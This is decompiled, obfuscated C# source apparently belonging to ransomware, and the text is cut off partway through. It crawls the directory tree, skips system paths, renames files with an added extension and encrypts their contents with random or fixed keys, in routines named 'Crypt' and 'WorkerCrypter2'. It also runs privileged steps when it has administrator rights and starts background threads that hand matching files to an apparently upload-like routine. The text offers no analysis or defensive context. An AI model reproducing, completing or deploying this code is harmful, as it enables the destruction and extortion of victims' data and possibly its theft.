using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using eyWttysFpUD;

namespace VyjVuXvolaw;

internal sealed class CcLtuTEQJD
{
	public sealed class xNoMbXrswm
	{
		private static StringCollection duezrzzCaPuEQa;

		private static List<string> vYkjRQYmIPdlVQA;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107404710));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains(getString_0(107404673)) && !text.ToLower().Contains(getString_0(107404684)) && !text.ToLower().Contains(getString_0(107389403)) && !text.ToLower().Contains(getString_0(107389422)) && !text.ToLower().Contains(getString_0(107404127)) && !text.ToLower().Contains(getString_0(107388730)) && !text.ToLower().Contains(getString_0(107388671)) && !text.ToLower().Contains(getString_0(107388686)) && !text.ToLower().Contains(getString_0(107388637)) && !text.ToLower().Contains(getString_0(107388652)) && !text.ToLower().Contains(getString_0(107388618)) && !text.ToLower().Contains(getString_0(107388569)) && !text.ToLower().Contains(getString_0(107388584)) && !text.ToLower().Contains(getString_0(107388539)) && !text.ToLower().Contains(getString_0(107388550)) && !text.ToLower().Contains(getString_0(107389017)) && !text.ToLower().Contains(getString_0(107389036)) && !text.ToLower().Contains(getString_0(107388987)) && !text.ToLower().Contains(getString_0(107389002)) && !text.Contains(RdzltCKTqMftoSE(getString_0(107388953))) && !text.Contains(getString_0(107388928)) && !text.Contains(getString_0(107388915)) && !text.EndsWith(getString_0(107395387)) && !text.EndsWith(getString_0(107388890)) && !text.EndsWith(getString_0(107388885)) && !text.EndsWith(getString_0(107388912)) && !text.EndsWith(getString_0(107388907)) && !text.ToLower().Contains(getString_0(107388902)) && !text.ToLower().Contains(NnEdFRIdEjUNKn))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(xtbYgrRCEXRhIt) * 1024.0 * 1024.0 && VIsIdhZRykLqTUQDB == getString_0(107396801))
							{
								vYkjRQYmIPdlVQA.Add(text);
							}
							else if (File.Exists(text) && VIsIdhZRykLqTUQDB == getString_0(107397090))
							{
								vYkjRQYmIPdlVQA.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return vYkjRQYmIPdlVQA;
		}

		static xNoMbXrswm()
		{
			Strings.CreateGetStringDelegate(typeof(xNoMbXrswm));
			duezrzzCaPuEQa = new StringCollection();
			vYkjRQYmIPdlVQA = new List<string>();
		}
	}

	private sealed class RiPRfhSjod
	{
		public string RUNABRXajzYGN;

		public bool _003CMain_003Eb__4(Process process_0)
		{
			return process_0.ProcessName == RUNABRXajzYGN;
		}
	}

	private sealed class YkCLfojrYcVIAWn
	{
		private sealed class TOlEmdVZzupto
		{
			public YkCLfojrYcVIAWn pZqvZRcoOOim;

			public string sQzjrqksarliXmnhP;

			public void _003CCrypt_003Eb__1e()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					zNFkxYSXyBRWl(WindowsIdentity.GetCurrent().Name, sQzjrqksarliXmnhP);
				}
			}

			public void _003CCrypt_003Eb__1f()
			{
				TbeJLLDmzCkm(sQzjrqksarliXmnhP, pZqvZRcoOOim.kBxPEhJgsWQ, pZqvZRcoOOim.HFAvvYnqToNmgO, pZqvZRcoOOim.FNoMAhwXyXFqhpl, pZqvZRcoOOim.NcdJFcIQTBnl);
			}
		}

		public string[] kBxPEhJgsWQ;

		public string[] FNoMAhwXyXFqhpl;

		public string NcdJFcIQTBnl;

		public string HFAvvYnqToNmgO;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__1d(string string_0)
		{
			TOlEmdVZzupto CS_0024_003C_003E8__locals0 = new TOlEmdVZzupto();
			CS_0024_003C_003E8__locals0.pZqvZRcoOOim = this;
			CS_0024_003C_003E8__locals0.sQzjrqksarliXmnhP = string_0;
			if (kwebbXGLWFTcp && !NRobqXdjvopcwE().Contains(getString_0(107387416)) && !NRobqXdjvopcwE().Contains(getString_0(107404148)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						zNFkxYSXyBRWl(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.sQzjrqksarliXmnhP);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (PEOsufOVorqNP == getString_0(107396807))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					TbeJLLDmzCkm(CS_0024_003C_003E8__locals0.sQzjrqksarliXmnhP, CS_0024_003C_003E8__locals0.pZqvZRcoOOim.kBxPEhJgsWQ, CS_0024_003C_003E8__locals0.pZqvZRcoOOim.HFAvvYnqToNmgO, CS_0024_003C_003E8__locals0.pZqvZRcoOOim.FNoMAhwXyXFqhpl, CS_0024_003C_003E8__locals0.pZqvZRcoOOim.NcdJFcIQTBnl);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				TbeJLLDmzCkm(CS_0024_003C_003E8__locals0.sQzjrqksarliXmnhP, kBxPEhJgsWQ, HFAvvYnqToNmgO, FNoMAhwXyXFqhpl, NcdJFcIQTBnl);
			}
		}

		static YkCLfojrYcVIAWn()
		{
			Strings.CreateGetStringDelegate(typeof(YkCLfojrYcVIAWn));
		}
	}

	private sealed class VwdjWlzHHKKh
	{
		private sealed class kmkVkorxgP
		{
			public VwdjWlzHHKKh XgsyVUPRwpozAEJ;

			public string BDZCAuBdihSBznm;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__2b()
			{
				foreach (string item in sAdxWTwIriShHsff)
				{
					if (BDZCAuBdihSBznm.ToLower().EndsWith(item + XgsyVUPRwpozAEJ.utySFCfMcfJj) && YzEXDgkVctSKX == getString_0(107396818))
					{
						if (Convert.ToInt32(ljXGZTEjpxSlR) * 1024 * 1024 > new FileInfo(BDZCAuBdihSBznm).Length)
						{
							try
							{
								ohJtITMsrrTaVTo.qhGPXbNSyvCayd(getString_0(107389869), getString_0(107389864), getString_0(107389883), BDZCAuBdihSBznm);
							}
							catch
							{
							}
						}
					}
					else if (BDZCAuBdihSBznm.ToLower().EndsWith(item) && YzEXDgkVctSKX == getString_0(107397107))
					{
						try
						{
							ohJtITMsrrTaVTo.qhGPXbNSyvCayd(getString_0(107389869), getString_0(107389864), getString_0(107389883), BDZCAuBdihSBznm);
						}
						catch
						{
						}
					}
				}
			}

			static kmkVkorxgP()
			{
				Strings.CreateGetStringDelegate(typeof(kmkVkorxgP));
			}
		}

		private sealed class FxgjJBeAgKI
		{
			public VwdjWlzHHKKh XgsyVUPRwpozAEJ;

			public string qyZDUzTWNklpNg;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__2d()
			{
				foreach (string item in sAdxWTwIriShHsff)
				{
					if (qyZDUzTWNklpNg.ToLower().EndsWith(item + XgsyVUPRwpozAEJ.utySFCfMcfJj) && YzEXDgkVctSKX == getString_0(107396821))
					{
						if (Convert.ToInt32(ljXGZTEjpxSlR) * 1024 * 1024 > new FileInfo(qyZDUzTWNklpNg).Length)
						{
							try
							{
								ohJtITMsrrTaVTo.qhGPXbNSyvCayd(getString_0(107389872), getString_0(107389867), getString_0(107389886), qyZDUzTWNklpNg);
							}
							catch
							{
							}
						}
					}
					else if (qyZDUzTWNklpNg.ToLower().EndsWith(item) && YzEXDgkVctSKX == getString_0(107397110))
					{
						try
						{
							ohJtITMsrrTaVTo.qhGPXbNSyvCayd(getString_0(107389872), getString_0(107389867), getString_0(107389886), qyZDUzTWNklpNg);
						}
						catch
						{
						}
					}
				}
			}

			static FxgjJBeAgKI()
			{
				Strings.CreateGetStringDelegate(typeof(FxgjJBeAgKI));
			}
		}

		public List<string> wyBNNoIkpYPp;

		public List<string> UWBePPalaohE;

		public string utySFCfMcfJj;

		public string[] nwbGeFCbtFNo;

		public string pPYjMJSGlCKrKN;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__2a(string string_0)
		{
			kmkVkorxgP CS_0024_003C_003E8__locals0;
			foreach (string item in UWBePPalaohE)
			{
				if (nwbGeFCbtFNo.Length != 0)
				{
					string[] array = nwbGeFCbtFNo;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_09a3;
					}
				}
				try
				{
					if (item.EndsWith(utySFCfMcfJj))
					{
						goto IL_09a3;
					}
				}
				catch (Exception)
				{
					goto IL_09a3;
				}
				if (!item.EndsWith(string_0) || ngVLNnblfHHw.Contains(item))
				{
					continue;
				}
				if (hbiMFBxXkVIgur == getString_0(107396815))
				{
					try
					{
						if (QeMFAvXech.PRtgpcDOjtZQp(item))
						{
							QeMFAvXech.lJHkFdxPppFD(item);
						}
					}
					catch
					{
					}
				}
				ngVLNnblfHHw.Add(item);
				if (!CyfMkozTWVl.Contains(Path.GetDirectoryName(item)))
				{
					CyfMkozTWVl.Add(Path.GetDirectoryName(item));
				}
				WexLWmlSQyxJV(item);
				try
				{
					new PEjkbesuAo().YJnTvaOXFymvWeYd(item);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (RiGciHwEXLcD)
							{
								Console.WriteLine(getString_0(107404111) + item + getString_0(107404066) + new FileInfo(item).Length + getString_0(107404045));
								Console.WriteLine(getString_0(107404036));
							}
						}
						catch
						{
						}
						AWnjIktergta(RdzltCKTqMftoSE(getString_0(107403963)), getString_0(107388800) + item + getString_0(107388800) + RdzltCKTqMftoSE(getString_0(107403906)) + getString_0(107388800) + Environment.UserName + getString_0(107388800) + RdzltCKTqMftoSE(getString_0(107403921)));
					}
				}
				catch (Exception ex2)
				{
					if (VLajbDNhoSbf)
					{
						try
						{
							File.AppendAllText(MGkBzYPheHDPb, getString_0(107387046) + item + getString_0(107404408) + ex2.Message + getString_0(107396286));
						}
						catch (Exception)
						{
						}
					}
					continue;
				}
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex4)
					{
						if (VLajbDNhoSbf)
						{
							try
							{
								File.AppendAllText(MGkBzYPheHDPb, getString_0(107387046) + item + getString_0(107404295) + ex4.Message + getString_0(107396286));
							}
							catch (Exception)
							{
							}
						}
						uAQgXZmBeIANml++;
						goto end_IL_02cd;
					}
					if (DuwAfCYTUCT == getString_0(107396815) && new FileInfo(item).Length > Convert.ToInt32(SHZkgBAmdkcxAL) * 1024 * 1024 && !wyBNNoIkpYPp.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new kmkVkorxgP();
						CS_0024_003C_003E8__locals0.XgsyVUPRwpozAEJ = this;
						try
						{
							if (utySFCfMcfJj != getString_0(107387306))
							{
								if (vzooNONBAAoJ)
								{
									utySFCfMcfJj = zwSwCGajjNfu + utySFCfMcfJj;
								}
								File.Move(item, item + utySFCfMcfJj);
							}
						}
						catch (Exception ex6)
						{
							if (VLajbDNhoSbf)
							{
								try
								{
									File.AppendAllText(MGkBzYPheHDPb, getString_0(107387046) + item + getString_0(107404234) + ex6.Message + getString_0(107396286));
								}
								catch (Exception)
								{
								}
							}
							uAQgXZmBeIANml++;
							goto end_IL_02cd;
						}
						CS_0024_003C_003E8__locals0.BDZCAuBdihSBznm = getString_0(107389305);
						if (utySFCfMcfJj != getString_0(107387306))
						{
							CS_0024_003C_003E8__locals0.BDZCAuBdihSBznm = item + utySFCfMcfJj;
						}
						else
						{
							CS_0024_003C_003E8__locals0.BDZCAuBdihSBznm = item;
						}
						if (SFDpinVUmMSqKHuE == getString_0(107396815))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in sAdxWTwIriShHsff)
								{
									if (CS_0024_003C_003E8__locals0.BDZCAuBdihSBznm.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.XgsyVUPRwpozAEJ.utySFCfMcfJj) && YzEXDgkVctSKX == kmkVkorxgP.getString_0(107396818))
									{
										if (Convert.ToInt32(ljXGZTEjpxSlR) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.BDZCAuBdihSBznm).Length)
										{
											try
											{
												ohJtITMsrrTaVTo.qhGPXbNSyvCayd(kmkVkorxgP.getString_0(107389869), kmkVkorxgP.getString_0(107389864), kmkVkorxgP.getString_0(107389883), CS_0024_003C_003E8__locals0.BDZCAuBdihSBznm);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.BDZCAuBdihSBznm.ToLower().EndsWith(item2) && YzEXDgkVctSKX == kmkVkorxgP.getString_0(107397107))
									{
										try
										{
											ohJtITMsrrTaVTo.qhGPXbNSyvCayd(kmkVkorxgP.getString_0(107389869), kmkVkorxgP.getString_0(107389864), kmkVkorxgP.getString_0(107389883), CS_0024_003C_003E8__locals0.BDZCAuBdihSBznm);
										}
										catch
										{
										}
									}
								}
							});
							thread.Priority = ThreadPriority.Normal;
							thread.IsBackground = false;
							thread.Start();
						}
						string text = NtziTGPOOPUxYBAz.zEQGtyDgSaEtAI(32);
						string text2 = getString_0(107389305);
						text2 = (AcumuDDlRST ? NtziTGPOOPUxYBAz.FPMzCARIEhq() : getString_0(107389305));
						string s = CEfwFkxuuHuowy.CfhzgVmlFFzI(text + text2);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array2 = null;
						byte[] byte_ = laLXjNdfIrlJ.STmRWaBeQYVyn(CS_0024_003C_003E8__locals0.BDZCAuBdihSBznm, Convert.ToInt32(SHZkgBAmdkcxAL) * 1024 * 1024);
						if (!laLXjNdfIrlJ.aOycAYsEuHTjq(WUAqTrQObZUDJY: (!rqILzTAnaGs) ? (AcumuDDlRST ? laLXjNdfIrlJ.ECnCWBxOsfyplx(byte_, Convert.FromBase64String(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : laLXjNdfIrlJ.ECnCWBxOsfyplx(byte_, Convert.FromBase64String(pPYjMJSGlCKrKN), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (AcumuDDlRST ? YcKZGEuitEbIot.sJmvPSqhFwcq(byte_, Convert.FromBase64String(text), Convert.FromBase64String(text2)) : YcKZGEuitEbIot.sJmvPSqhFwcq(byte_, Convert.FromBase64String(pPYjMJSGlCKrKN), Convert.FromBase64String(MLaZeafODt))), miqsVkLePvjxa: CS_0024_003C_003E8__locals0.BDZCAuBdihSBznm, WUAskcktCGjCrN: bytes))
						{
							try
							{
								File.Move(item + utySFCfMcfJj, item);
							}
							catch (Exception)
							{
							}
							continue;
						}
						goto IL_09a3;
					}
					if (vzooNONBAAoJ)
					{
						utySFCfMcfJj = zwSwCGajjNfu + utySFCfMcfJj;
					}
					string text3 = NtziTGPOOPUxYBAz.zEQGtyDgSaEtAI(32);
					string text4 = getString_0(107389305);
					text4 = (AcumuDDlRST ? NtziTGPOOPUxYBAz.FPMzCARIEhq() : getString_0(107389305));
					string s2 = CEfwFkxuuHuowy.CfhzgVmlFFzI(text3 + text4);
					byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
					if (utySFCfMcfJj != getString_0(107387306))
					{
						if (!qtSCtAyEKwnBa)
						{
							if (!AcumuDDlRST)
							{
								XiqCbtvoxi(item, item + utySFCfMcfJj, oybyixAEyQBUaM);
							}
							else
							{
								XiqCbtvoxi(item, item + utySFCfMcfJj, Convert.FromBase64String(text3));
							}
						}
						else
						{
							try
							{
								if (!AcumuDDlRST)
								{
									FvQSVpHgjxqhRPuFc(item, item + utySFCfMcfJj, oybyixAEyQBUaM, Convert.FromBase64String(MLaZeafODt));
								}
								else
								{
									FvQSVpHgjxqhRPuFc(item, item + utySFCfMcfJj, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
								}
							}
							catch (Exception ex9)
							{
								if (VLajbDNhoSbf)
								{
									try
									{
										File.AppendAllText(MGkBzYPheHDPb, getString_0(107387046) + item + getString_0(107387324) + ex9.Message + getString_0(107396286));
									}
									catch (Exception)
									{
									}
								}
								uAQgXZmBeIANml++;
								try
								{
									File.Move(item + utySFCfMcfJj, item);
								}
								catch (Exception)
								{
								}
								goto end_IL_02cd;
							}
						}
					}
					else if (!qtSCtAyEKwnBa)
					{
						if (!AcumuDDlRST)
						{
							XiqCbtvoxi(item, item + getString_0(107387301), oybyixAEyQBUaM);
						}
						else
						{
							XiqCbtvoxi(item, item + getString_0(107387301), Convert.FromBase64String(text3));
						}
					}
					else
					{
						try
						{
							if (!AcumuDDlRST)
							{
								FvQSVpHgjxqhRPuFc(item, item, oybyixAEyQBUaM, Convert.FromBase64String(MLaZeafODt));
							}
							else
							{
								FvQSVpHgjxqhRPuFc(item, item, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
							}
						}
						catch (Exception ex12)
						{
							if (VLajbDNhoSbf)
							{
								try
								{
									File.AppendAllText(MGkBzYPheHDPb, getString_0(107387046) + item + getString_0(107387324) + ex12.Message + getString_0(107396286));
								}
								catch (Exception)
								{
								}
							}
							uAQgXZmBeIANml++;
							goto end_IL_02cd;
						}
					}
					if (AcumuDDlRST)
					{
						if (utySFCfMcfJj != getString_0(107387306))
						{
							hfPzCBDyuj(item + utySFCfMcfJj, bytes2);
						}
						else
						{
							hfPzCBDyuj(item, bytes2);
						}
					}
					goto IL_09a3;
					end_IL_02cd:;
				}
				catch (Exception)
				{
					goto IL_09a3;
				}
				continue;
				IL_09a3:
				UWBePPalaohE.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__2c(string string_0)
		{
			FxgjJBeAgKI CS_0024_003C_003E8__locals0 = new FxgjJBeAgKI();
			CS_0024_003C_003E8__locals0.XgsyVUPRwpozAEJ = this;
			CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg = string_0;
			if (nwbGeFCbtFNo.Length != 0)
			{
				string[] array = nwbGeFCbtFNo;
				int num = 0;
				while (num < array.Length)
				{
					string value = array[num];
					if (!CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0a6b;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg.EndsWith(utySFCfMcfJj))
				{
					goto IL_0a6b;
				}
			}
			catch (Exception)
			{
				goto IL_0a6b;
			}
			if (!ngVLNnblfHHw.Contains(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg))
			{
				if (hbiMFBxXkVIgur == getString_0(107396815))
				{
					try
					{
						if (QeMFAvXech.PRtgpcDOjtZQp(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg))
						{
							QeMFAvXech.lJHkFdxPppFD(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg);
						}
					}
					catch
					{
					}
				}
				ngVLNnblfHHw.Add(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg);
				if (!CyfMkozTWVl.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg)))
				{
					CyfMkozTWVl.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg));
				}
				WexLWmlSQyxJV(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg);
				try
				{
					new PEjkbesuAo().YJnTvaOXFymvWeYd(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (RiGciHwEXLcD)
							{
								Console.WriteLine(getString_0(107404111) + CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + getString_0(107404066) + new FileInfo(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg).Length + getString_0(107404045));
								Console.WriteLine(getString_0(107404036));
							}
						}
						catch
						{
						}
						AWnjIktergta(RdzltCKTqMftoSE(getString_0(107403963)), getString_0(107388800) + CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + getString_0(107388800) + RdzltCKTqMftoSE(getString_0(107403906)) + getString_0(107388800) + Environment.UserName + getString_0(107388800) + RdzltCKTqMftoSE(getString_0(107403921)));
					}
				}
				catch (Exception ex2)
				{
					if (VLajbDNhoSbf)
					{
						try
						{
							File.AppendAllText(MGkBzYPheHDPb, getString_0(107387046) + CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + getString_0(107404408) + ex2.Message + getString_0(107396286));
							return;
						}
						catch (Exception)
						{
							return;
						}
					}
					return;
				}
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg).Length != 0L)
						{
							goto end_IL_031d;
						}
						goto end_IL_031d_2;
						end_IL_031d:;
					}
					catch (Exception ex4)
					{
						if (VLajbDNhoSbf)
						{
							try
							{
								File.AppendAllText(MGkBzYPheHDPb, getString_0(107387046) + CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + getString_0(107404295) + ex4.Message + getString_0(107396286));
							}
							catch (Exception)
							{
							}
						}
						uAQgXZmBeIANml++;
						goto end_IL_031d_2;
					}
					if (DuwAfCYTUCT == getString_0(107396815) && new FileInfo(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg).Length > Convert.ToInt32(SHZkgBAmdkcxAL) * 1024 * 1024)
					{
						try
						{
							if (utySFCfMcfJj != getString_0(107387306))
							{
								if (vzooNONBAAoJ)
								{
									utySFCfMcfJj = zwSwCGajjNfu + utySFCfMcfJj;
								}
								File.Move(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + utySFCfMcfJj);
							}
						}
						catch (Exception ex6)
						{
							if (VLajbDNhoSbf)
							{
								try
								{
									File.AppendAllText(MGkBzYPheHDPb, getString_0(107387046) + CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + getString_0(107404234) + ex6.Message + getString_0(107396286));
								}
								catch (Exception)
								{
								}
							}
							uAQgXZmBeIANml++;
							return;
						}
						if (utySFCfMcfJj != getString_0(107387306))
						{
							CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg += utySFCfMcfJj;
						}
						if (SFDpinVUmMSqKHuE == getString_0(107396815))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item in sAdxWTwIriShHsff)
								{
									if (CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.XgsyVUPRwpozAEJ.utySFCfMcfJj) && YzEXDgkVctSKX == FxgjJBeAgKI.getString_0(107396821))
									{
										if (Convert.ToInt32(ljXGZTEjpxSlR) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg).Length)
										{
											try
											{
												ohJtITMsrrTaVTo.qhGPXbNSyvCayd(FxgjJBeAgKI.getString_0(107389872), FxgjJBeAgKI.getString_0(107389867), FxgjJBeAgKI.getString_0(107389886), CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg.ToLower().EndsWith(item) && YzEXDgkVctSKX == FxgjJBeAgKI.getString_0(107397110))
									{
										try
										{
											ohJtITMsrrTaVTo.qhGPXbNSyvCayd(FxgjJBeAgKI.getString_0(107389872), FxgjJBeAgKI.getString_0(107389867), FxgjJBeAgKI.getString_0(107389886), CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = NtziTGPOOPUxYBAz.zEQGtyDgSaEtAI(32);
						string text2 = getString_0(107389305);
						text2 = (AcumuDDlRST ? NtziTGPOOPUxYBAz.FPMzCARIEhq() : getString_0(107389305));
						string s = CEfwFkxuuHuowy.CfhzgVmlFFzI(text + text2);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array2 = null;
						byte[] byte_ = laLXjNdfIrlJ.STmRWaBeQYVyn(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, Convert.ToInt32(SHZkgBAmdkcxAL) * 1024 * 1024);
						if (!laLXjNdfIrlJ.aOycAYsEuHTjq(WUAqTrQObZUDJY: (!rqILzTAnaGs) ? (AcumuDDlRST ? laLXjNdfIrlJ.ECnCWBxOsfyplx(byte_, Convert.FromBase64String(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : laLXjNdfIrlJ.ECnCWBxOsfyplx(byte_, Convert.FromBase64String(pPYjMJSGlCKrKN), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (AcumuDDlRST ? YcKZGEuitEbIot.sJmvPSqhFwcq(byte_, Convert.FromBase64String(text), Convert.FromBase64String(text2)) : YcKZGEuitEbIot.sJmvPSqhFwcq(byte_, Convert.FromBase64String(pPYjMJSGlCKrKN), Convert.FromBase64String(MLaZeafODt))), miqsVkLePvjxa: CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, WUAskcktCGjCrN: bytes))
						{
							try
							{
								File.Move(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + utySFCfMcfJj, CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg);
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
					}
					else
					{
						if (vzooNONBAAoJ)
						{
							utySFCfMcfJj = zwSwCGajjNfu + utySFCfMcfJj;
						}
						string text3 = NtziTGPOOPUxYBAz.zEQGtyDgSaEtAI(32);
						string text4 = getString_0(107389305);
						text4 = (AcumuDDlRST ? NtziTGPOOPUxYBAz.FPMzCARIEhq() : getString_0(107389305));
						string s2 = CEfwFkxuuHuowy.CfhzgVmlFFzI(text3 + text4);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (utySFCfMcfJj != getString_0(107387306))
						{
							if (!qtSCtAyEKwnBa)
							{
								if (!AcumuDDlRST)
								{
									XiqCbtvoxi(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + utySFCfMcfJj, oybyixAEyQBUaM);
								}
								else
								{
									XiqCbtvoxi(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + utySFCfMcfJj, Convert.FromBase64String(text3));
								}
							}
							else
							{
								try
								{
									if (!AcumuDDlRST)
									{
										FvQSVpHgjxqhRPuFc(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + utySFCfMcfJj, oybyixAEyQBUaM, Convert.FromBase64String(MLaZeafODt));
									}
									else
									{
										FvQSVpHgjxqhRPuFc(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + utySFCfMcfJj, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
									}
								}
								catch (Exception ex9)
								{
									if (VLajbDNhoSbf)
									{
										try
										{
											File.AppendAllText(MGkBzYPheHDPb, getString_0(107387046) + CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + getString_0(107387324) + ex9.Message + getString_0(107396286));
										}
										catch (Exception)
										{
										}
									}
									uAQgXZmBeIANml++;
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + utySFCfMcfJj, CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
						}
						else if (!qtSCtAyEKwnBa)
						{
							if (!AcumuDDlRST)
							{
								XiqCbtvoxi(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + getString_0(107387301), oybyixAEyQBUaM);
							}
							else
							{
								XiqCbtvoxi(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + getString_0(107387301), Convert.FromBase64String(text3));
							}
						}
						else
						{
							try
							{
								if (!AcumuDDlRST)
								{
									FvQSVpHgjxqhRPuFc(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, oybyixAEyQBUaM, Convert.FromBase64String(MLaZeafODt));
								}
								else
								{
									FvQSVpHgjxqhRPuFc(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
								}
							}
							catch (Exception ex12)
							{
								if (VLajbDNhoSbf)
								{
									try
									{
